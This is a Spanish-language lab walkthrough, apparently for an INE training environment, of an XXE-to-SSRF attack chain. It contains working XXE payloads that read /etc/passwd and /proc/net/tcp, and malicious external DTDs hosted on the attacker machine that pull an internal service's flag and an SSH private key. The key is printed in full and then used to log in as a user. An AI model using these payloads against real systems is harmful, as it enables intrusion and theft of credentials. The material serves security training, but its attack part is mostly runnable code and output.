---
layout: default
---

# SSRF to RCE

enumeración del dominio:

```bash
root@INE:~# nmap demo.ine.local
Starting Nmap 7.92 ( https://nmap.org ) at 2024-12-30 19:23 IST
Nmap scan report for demo.ine.local (192.200.245.3)
Host is up (0.000025s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
5000/tcp open  upnp
8000/tcp open  http-alt
MAC Address: 02:42:C0:C8:F5:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.22 seconds

```



### Explotación XXE


Validando si es posible la explotación:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<parent>
    <child>
        <name>Test Name</name>
        <description>Test Description</description>
    </child>
</parent>
```

![DTD malicioso](./assets/images/xxe_ssrf.png)



validando la posibilidad de LFI:

```xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
    <!ENTITY file SYSTEM "file:///etc/passwd">
]>
<data>&file;</data>

```

![DTD malicioso](./assets/images/xxe_users_ssrf.png)






### Extracción de conexiones


```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
    <!ENTITY file SYSTEM "file:///proc/net/tcp">
]>
<data>&file;</data>
```

```bash
 sl  local_address rem_address   st tx_queue rx_queue tr tm-&gt;when retrnsmt   uid  timeout inode                                                        
 0: 00000000:0016 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 1946780532 1 0000000000000000 100 0 0 10 0                   
 1: 00000000:1F40 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 1946841230 1 0000000000000000 100 0 0 10 0                   
 2: 0100007F:22B8 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 1946817036 1 0000000000000000 100 0 0 10 0                   
 3: 0B00007F:89FD 00000000:0000 0A 00000000:00000000 00:00000000 00000000 65534        0 1946831211 1 0000000000000000 100 0 0 10 0                   
 4: 03F5C8C0:1F40 02F5C8C0:8CC8 06 00000000:00000000 03:0000176E 00000000     0        0 0 3 0000000000000000                                         
 5: 03F5C8C0:1F40 02F5C8C0:8CCE 01 00000000:00000000 00:00000000 00000000     0        0 1947331238 1 0000000000000000 20 4 30 10 -1
```

```bash
root@INE:~# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.1.0.10  netmask 255.255.0.0  broadcast 10.1.255.255
        ether 02:42:0a:01:00:0a  txqueuelen 0  (Ethernet)
        RX packets 93451  bytes 7010323 (6.6 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 81503  bytes 23251228 (22.1 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.200.245.2  netmask 255.255.255.0  broadcast 192.200.245.255
        ether 02:42:c0:c8:f5:02  txqueuelen 0  (Ethernet)
        RX packets 1375  bytes 675572 (659.7 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1375  bytes 101816 (99.4 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 264320  bytes 528885278 (504.3 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 264320  bytes 528885278 (504.3 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0


```
```bash
root@INE:~# while read line; do echo $line | awk '{print $2"-"$3}'; done < data.txt > connections.txt
root@INE:~# cat connections.txt 
00000000:0016-00000000:0000
00000000:1F40-00000000:0000
0100007F:22B8-00000000:0000
0B00007F:89FD-00000000:0000
03F5C8C0:1F40-02F5C8C0:8CC8
03F5C8C0:1F40-02F5C8C0:8CCE
```

Conversor en python:
```python
import socket
import struct
#hex_ip = input("Enter IP (in hex): ")
#print(type(hex_ip))
#print(hex_ip)
filename = "./connections.txt"
with open(filename, 'r') as file:
    for line in file:
        print(line.rstrip())
        local_address = line.rstrip().split("-")[0].split(":")[0]
        local_port = line.rstrip().split("-")[0].split(":")[1]
        remote_address = line.rstrip().split("-")[1].split(":")[0]
        remote_port = line.rstrip().split("-")[1].split(":")[1]
        local_address = int(local_address, 16)
        local_port = int('0x'+local_port,16)
        remote_address = int(remote_address, 16)
        remote_port = int('0x'+remote_port, 16)
        print("local_address: ", socket.inet_ntoa(struct.pack("<L", local_address)),":", local_port," remote_address: ", socket.inet_ntoa(struct.pack("<L", remote_address)), ":", remote_port)

```

```bash
root@INE:~# python convert.py 
00000000:0016-00000000:0000
('local_address: ', '0.0.0.0', ':', 22, ' remote_address: ', '0.0.0.0', ':', 0)
00000000:1F40-00000000:0000
('local_address: ', '0.0.0.0', ':', 8000, ' remote_address: ', '0.0.0.0', ':', 0)
0100007F:22B8-00000000:0000
('local_address: ', '127.0.0.1', ':', 8888, ' remote_address: ', '0.0.0.0', ':', 0)
0B00007F:89FD-00000000:0000
('local_address: ', '127.0.0.11', ':', 35325, ' remote_address: ', '0.0.0.0', ':', 0)
03F5C8C0:1F40-02F5C8C0:8CC8
('local_address: ', '192.200.245.3', ':', 8000, ' remote_address: ', '192.200.245.2', ':', 36040)
03F5C8C0:1F40-02F5C8C0:8CCE
('local_address: ', '192.200.245.3', ':', 8000, ' remote_address: ', '192.200.245.2', ':', 36046)

```

Se detecta que el servidor está escuchando en local por el puerto 8888, probablemente un servicio web, esto nos guia al ataque del tipo XSRF.


### XXE to XRF 
Acceso mediandte la vulnerabilidad XXE al puerto 8888 interno de la máquina:

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE data [
    <!ENTITY % dtd SYSTEM "http://192.200.245.2:80/evil.dtd">
    %dtd;
    %all;
]>
<data>&fileContents;</data>
```

cargando en local el DTD malicioso:

```xml
<!ENTITY % start "<![CDATA[">
<!ENTITY % file SYSTEM "http://localhost:8888">
<!ENTITY % end "]]>">
<!ENTITY % all "<!ENTITY fileContents '%start;%file;%end;'>">
```


```xml

<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE data [ 
<!ENTITY % dtd SYSTEM "http://192.200.245.2:80/evil.dtd">
<!ENTITY % start "
<![CDATA[">
<!ENTITY % file SYSTEM "http://localhost:8888">
<!ENTITY % end "]]>">
<!ENTITY % all "
<!ENTITY fileContents '%start;%file;%end;'>">
<!ENTITY fileContents '
<![CDATA[
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html>
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=ascii">
			<title>Directory listing for /</title>
		</head>
		<body>
			<h1>Directory listing for /</h1>
			<hr>
				<ul>
					<li>
						<a href=".ssh/">.ssh/</a>
					</li>
					<li>
						<a href="flag1">flag1</a>
					</li>
				</ul>
				<hr>
				</body></html> ]]>'> ]>
				<data>
					<![CDATA[
					<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
					<html>
						<head>
							<meta http-equiv="Content-Type" content="text/html; charset=ascii">
								<title>Directory listing for /</title>
							</head>
							<body>
								<h1>Directory listing for /</h1>
								<hr>
									<ul>
										<li>
											<a href=".ssh/">.ssh/</a>
										</li>
										<li>
											<a href="flag1">flag1</a>
										</li>
									</ul>
									<hr>
									</body></html> ]]>
								</data> 
```


### XXE to XRF flag1

Payload malicioso
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE data [
    <!ENTITY % dtd SYSTEM "http://192.200.245.2:80/evil.dtd">
    %dtd;
    %all;
]>
<data>&fileContents;</data>
```
DTD malicioso
```xml

root@INE:~# cat /var/www/html/evil.dtd
<!ENTITY % start "<![CDATA[">
<!ENTITY % file SYSTEM "http://localhost:8888/flag1">
<!ENTITY % end "]]>">
<!ENTITY % all "<!ENTITY fileContents '%start;%file;%end;'>">


```

repuesta:
```xml
The supplied XML is valid:
<?xml version="1.0" encoding="ISO-8859-1"?> 
<!DOCTYPE data [ <!ENTITY % dtd SYSTEM "http://192.200.245.2:80/evil.dtd"> 
<!ENTITY % start "<![CDATA["> <!ENTITY % file SYSTEM "http://localhost:8888/flag1"> <!ENTITY % end "]]>"> 
<!ENTITY % all "<!ENTITY fileContents '%start;%file;%end;'>"> 
<!ENTITY fileContents "<![CDATA[5f1210be00b4b8dfecba7b56181d905c ]]>"> ]> 
<data>
<![CDATA[5f1210be00b4b8dfecba7b56181d905c ]]>
</data> 
```



### XXE to XRF access ssh

Payload malicioso
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE data [
    <!ENTITY % dtd SYSTEM "http://192.200.245.2:80/evil.dtd">
    %dtd;
    %all;
]>
<data>&fileContents;</data>
```
DTD malicioso
```xml

root@INE:~# cat /var/www/html/evil.dtd
<!ENTITY % start "<![CDATA[">
<!ENTITY % file SYSTEM "http://localhost:8888/.ssh/id_rsa">
<!ENTITY % end "]]>">
<!ENTITY % all "<!ENTITY fileContents '%start;%file;%end;'>">


```

repuesta:
```xml
<?xml version="1.0" encoding="ISO-8859-1"?> <!DOCTYPE data [ <!ENTITY % dtd SYSTEM "http://192.200.245.2:80/evil.dtd"> <!ENTITY % start "<![CDATA["> <!ENTITY % file SYSTEM "http://localhost:8888/.ssh/id_rsa"> <!ENTITY % end "]]>"> <!ENTITY % all "<!ENTITY fileContents '%start;%file;%end;'>"> <!ENTITY fileContents "<![CDATA[-----BEGIN RSA PRIVATE KEY----- MIIEowIBAAKCAQEAslmUyVTE0QrmRq2aDQr0D+Ybs+wgMMmQ/VD2PT04F1GqrUsB Xh9begi1LKXVRmX7BjLEw6sUIgP83GyJF3/S3l7iGHF1mZzUd6fOL9ev76zvGp5N MokaL6ED0F1HptWaePhGlh8tSnV92++b9t+JR9yVcbQPo2Qnj03hnRjRsDnM+wz0 BMtUXU+YwhGBZzFwKlVVOVGeFqBGwqnrYVCZezWLUYSP/bGPRS31Sxo7qFF4nyv9 E4COyehOAtDnLXnmPGZILjgyQwTcCtK+hIi1dzRCdAQvYdcoJKHoKQ7li/Lp8WP5 lEHKZHjsEYP/8XSQ4oEORlB5kbbTMzYaHKvNCwIDAQABAoIBAQCRJNQwURtnoH4t MOT5Dlv3gGY1M8oyyieD8FqlFehLGfxT0YHIbq6Mjv+a2U7LXv0+WxzEvLrCwAoN /QpIpI8gx4krKVLyc655vofPabHV1SA1wnTC1s8HyfsHnJJOVPHE1xDi5XZ/bUTD M6ny7JKVeA/rHAXKDB0hw9kDd4pW5iddcB7khjZBdJP07zMwiSz675idjF2aJ02u n8+gm+SMbwRPCYRGYqWmtOAnve2lGTrmFFlxcSMfuuE5EWCFFUC4iHU4/lvikpUw r+dX7zTCp5vRwOjcNYUvP1z1MDtOTYxOceL9LsIijDD++z/p6/mwKFkFcZ3dQNqX KVB2gs1pAoGBANu0Qkm27PyzAlyiVBXycIuVb4wxn3AjiDkgn4KooCM2JWzCrtbu WpYHsjoIlxPGzAS8Io+QW3jvVWqM1QKTlbBMVKO1/LjakgXx1vkO2oD4qT1YGXq5 yiWq5u/KPjwZ+nP0L5YfBSDXIy7yka7fV8cLmktdTwq7Mr7C6N2LjGRVAoGBAM/Q Xg/wGlskVXlmtbI58G2aN8YO6kKdgORyIE4FzRtTUNi5hBXmKsCdWSO+qjNhmeF/ 4pgwUhdBiQyOtIG8hgFGXBlR4PRXkyoZNWhkMSa28IPrWm3JPW29JrYhOjBj8jLv aetNkAeFp1G2vF8l3AzIRq5DIRsOpFXol1kbjcvfAoGATIchf+PD8NG5xOKWP37P TQ+kZ0TxsHHwBVYjubNa9Gjr6FJ37E3iJ9hOcICFf1IDxrJxp2g1NI7JRfAAUoFt 5pbv9IZznUAlFQUESISv/7Sd3sxNM757d1tsTaI4w16ZKsKnwLbVZncJvlSoAi2x uZeFCzNZUPeb2W6zBliRcnECgYB/UqGe0DPFraA0zkn6VWdKL5eGYHMEt21WCdpj E0jUOhqpfhhANpHxCzanINU0v9LBB1J0ff59wyhNqk1Lw46yz0H0PWc/LTy8KU/A kspOdv0rRhJUe1yIlMBYDEmThljI/kh94zqgcTHPbc9B2HdW2Yn8kKKC6lijTesU rD4XLwKBgHLaJ/ApKo6Ih+omB/1jheLINj0uonH6yiKBm6lF4rUFvFuP2hNSYUAQ zcTVZOvUkkwSapLjBpIgVxZRV1E1ApZrBcG84/4eOWIJZsR8haL9QHE2l9VPYL/k 3fon5PM6KkQsVOj5wRBBulLDmVeitRHmTvm1fmN/ornq03hDdLE3 -----END RSA PRIVATE KEY----- ]]>"> ]> <data><![CDATA[-----BEGIN RSA PRIVATE KEY----- MIIEowIBAAKCAQEAslmUyVTE0QrmRq2aDQr0D+Ybs+wgMMmQ/VD2PT04F1GqrUsB Xh9begi1LKXVRmX7BjLEw6sUIgP83GyJF3/S3l7iGHF1mZzUd6fOL9ev76zvGp5N MokaL6ED0F1HptWaePhGlh8tSnV92++b9t+JR9yVcbQPo2Qnj03hnRjRsDnM+wz0 BMtUXU+YwhGBZzFwKlVVOVGeFqBGwqnrYVCZezWLUYSP/bGPRS31Sxo7qFF4nyv9 E4COyehOAtDnLXnmPGZILjgyQwTcCtK+hIi1dzRCdAQvYdcoJKHoKQ7li/Lp8WP5 lEHKZHjsEYP/8XSQ4oEORlB5kbbTMzYaHKvNCwIDAQABAoIBAQCRJNQwURtnoH4t MOT5Dlv3gGY1M8oyyieD8FqlFehLGfxT0YHIbq6Mjv+a2U7LXv0+WxzEvLrCwAoN /QpIpI8gx4krKVLyc655vofPabHV1SA1wnTC1s8HyfsHnJJOVPHE1xDi5XZ/bUTD M6ny7JKVeA/rHAXKDB0hw9kDd4pW5iddcB7khjZBdJP07zMwiSz675idjF2aJ02u n8+gm+SMbwRPCYRGYqWmtOAnve2lGTrmFFlxcSMfuuE5EWCFFUC4iHU4/lvikpUw r+dX7zTCp5vRwOjcNYUvP1z1MDtOTYxOceL9LsIijDD++z/p6/mwKFkFcZ3dQNqX KVB2gs1pAoGBANu0Qkm27PyzAlyiVBXycIuVb4wxn3AjiDkgn4KooCM2JWzCrtbu WpYHsjoIlxPGzAS8Io+QW3jvVWqM1QKTlbBMVKO1/LjakgXx1vkO2oD4qT1YGXq5 yiWq5u/KPjwZ+nP0L5YfBSDXIy7yka7fV8cLmktdTwq7Mr7C6N2LjGRVAoGBAM/Q Xg/wGlskVXlmtbI58G2aN8YO6kKdgORyIE4FzRtTUNi5hBXmKsCdWSO+qjNhmeF/ 4pgwUhdBiQyOtIG8hgFGXBlR4PRXkyoZNWhkMSa28IPrWm3JPW29JrYhOjBj8jLv aetNkAeFp1G2vF8l3AzIRq5DIRsOpFXol1kbjcvfAoGATIchf+PD8NG5xOKWP37P TQ+kZ0TxsHHwBVYjubNa9Gjr6FJ37E3iJ9hOcICFf1IDxrJxp2g1NI7JRfAAUoFt 5pbv9IZznUAlFQUESISv/7Sd3sxNM757d1tsTaI4w16ZKsKnwLbVZncJvlSoAi2x uZeFCzNZUPeb2W6zBliRcnECgYB/UqGe0DPFraA0zkn6VWdKL5eGYHMEt21WCdpj E0jUOhqpfhhANpHxCzanINU0v9LBB1J0ff59wyhNqk1Lw46yz0H0PWc/LTy8KU/A kspOdv0rRhJUe1yIlMBYDEmThljI/kh94zqgcTHPbc9B2HdW2Yn8kKKC6lijTesU rD4XLwKBgHLaJ/ApKo6Ih+omB/1jheLINj0uonH6yiKBm6lF4rUFvFuP2hNSYUAQ zcTVZOvUkkwSapLjBpIgVxZRV1E1ApZrBcG84/4eOWIJZsR8haL9QHE2l9VPYL/k 3fon5PM6KkQsVOj5wRBBulLDmVeitRHmTvm1fmN/ornq03hDdLE3 -----END RSA PRIVATE KEY----- ]]></data> 
```





validación de usuario:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
    <!ENTITY file SYSTEM "file:///etc/passwd">
]>
<data>&file;</data>
```

```bash
root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 bin:x:2:2:bin:/bin:/usr/sbin/nologin
 sys:x:3:3:sys:/dev:/usr/sbin/nologin
 sync:x:4:65534:sync:/bin:/bin/sync
 games:x:5:60:games:/usr/games:/usr/sbin/nologin
 man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
 lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
 mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
 news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
 uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
 proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
 www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
 backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
 list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
 irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingn
 ats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
 nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
 _apt:x:100:65534::/nonexistent:/usr/sbin/nologin
 systemd-network:x:101:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
 systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
 messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
 sshd:x:104:65534::/run/sshd:/usr/sbin/nologin
 david:x:999:999:david:/home/david:/bin/bash
 amanda:x:998:100:amanda:/home/amanda:/bin/bash
 jeremy:x:997:100:jeremy:/home/jeremy:/bin/bash
```
debe pertenecer a un usuario que tenga una bash shell.

configuración de la clave RSA:

```bash
root@INE:/var/www/html# sed -e "s/-----BEGIN RSA PRIVATE KEY-----/&\n/"     -e "s/-----END RSA PRIVATE KEY-----/\n&/"     -e "s/\S\{64\}/&\n/g"     id_rsa
-----BEGIN RSA PRIVATE KEY-----
 MIIEowIBAAKCAQEAslmUyVTE0QrmRq2aDQr0D+Ybs+wgMMmQ/VD2PT04F1GqrUsB
 Xh9begi1LKXVRmX7BjLEw6sUIgP83GyJF3/S3l7iGHF1mZzUd6fOL9ev76zvGp5N
 MokaL6ED0F1HptWaePhGlh8tSnV92++b9t+JR9yVcbQPo2Qnj03hnRjRsDnM+wz0
 BMtUXU+YwhGBZzFwKlVVOVGeFqBGwqnrYVCZezWLUYSP/bGPRS31Sxo7qFF4nyv9
 E4COyehOAtDnLXnmPGZILjgyQwTcCtK+hIi1dzRCdAQvYdcoJKHoKQ7li/Lp8WP5
 lEHKZHjsEYP/8XSQ4oEORlB5kbbTMzYaHKvNCwIDAQABAoIBAQCRJNQwURtnoH4t
 MOT5Dlv3gGY1M8oyyieD8FqlFehLGfxT0YHIbq6Mjv+a2U7LXv0+WxzEvLrCwAoN
 /QpIpI8gx4krKVLyc655vofPabHV1SA1wnTC1s8HyfsHnJJOVPHE1xDi5XZ/bUTD
 M6ny7JKVeA/rHAXKDB0hw9kDd4pW5iddcB7khjZBdJP07zMwiSz675idjF2aJ02u
 n8+gm+SMbwRPCYRGYqWmtOAnve2lGTrmFFlxcSMfuuE5EWCFFUC4iHU4/lvikpUw
 r+dX7zTCp5vRwOjcNYUvP1z1MDtOTYxOceL9LsIijDD++z/p6/mwKFkFcZ3dQNqX
 KVB2gs1pAoGBANu0Qkm27PyzAlyiVBXycIuVb4wxn3AjiDkgn4KooCM2JWzCrtbu
 WpYHsjoIlxPGzAS8Io+QW3jvVWqM1QKTlbBMVKO1/LjakgXx1vkO2oD4qT1YGXq5
 yiWq5u/KPjwZ+nP0L5YfBSDXIy7yka7fV8cLmktdTwq7Mr7C6N2LjGRVAoGBAM/Q
 Xg/wGlskVXlmtbI58G2aN8YO6kKdgORyIE4FzRtTUNi5hBXmKsCdWSO+qjNhmeF/
 4pgwUhdBiQyOtIG8hgFGXBlR4PRXkyoZNWhkMSa28IPrWm3JPW29JrYhOjBj8jLv
 aetNkAeFp1G2vF8l3AzIRq5DIRsOpFXol1kbjcvfAoGATIchf+PD8NG5xOKWP37P
 TQ+kZ0TxsHHwBVYjubNa9Gjr6FJ37E3iJ9hOcICFf1IDxrJxp2g1NI7JRfAAUoFt
 5pbv9IZznUAlFQUESISv/7Sd3sxNM757d1tsTaI4w16ZKsKnwLbVZncJvlSoAi2x
 uZeFCzNZUPeb2W6zBliRcnECgYB/UqGe0DPFraA0zkn6VWdKL5eGYHMEt21WCdpj
 E0jUOhqpfhhANpHxCzanINU0v9LBB1J0ff59wyhNqk1Lw46yz0H0PWc/LTy8KU/A
 kspOdv0rRhJUe1yIlMBYDEmThljI/kh94zqgcTHPbc9B2HdW2Yn8kKKC6lijTesU
 rD4XLwKBgHLaJ/ApKo6Ih+omB/1jheLINj0uonH6yiKBm6lF4rUFvFuP2hNSYUAQ
 zcTVZOvUkkwSapLjBpIgVxZRV1E1ApZrBcG84/4eOWIJZsR8haL9QHE2l9VPYL/k
 3fon5PM6KkQsVOj5wRBBulLDmVeitRHmTvm1fmN/ornq03hDdLE3 
-----END RSA PRIVATE KEY-----
root@INE:/var/www/html# sed -e "s/-----BEGIN RSA PRIVATE KEY-----/&\n/"     -e "s/-----END RSA PRIVATE KEY-----/\n&/"     -e "s/\S\{64\}/&\n/g"     id_rsa > access_rsa
root@INE:/var/www/html# chmod 600 access_rsa 
```

permisos y acceso :

```bash
root@INE:/var/www/html# ssh -i access_rsa david@demo.ine.local
The authenticity of host 'demo.ine.local (192.200.245.3)' can't be established.
ED25519 key fingerprint is SHA256:/IaZaAYgv06clj6XTixGhPQCKrYvdxkCp2XdVvwdZt4.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'demo.ine.local' (ED25519) to the list of known hosts.
Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 6.8.0-40-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

david@demo:~$ whoami
david
david@demo:~$ hostname
demo.ine.local

```
![Acceso SSH](./assets/images/ssrf_ssh.png)

[back](./)
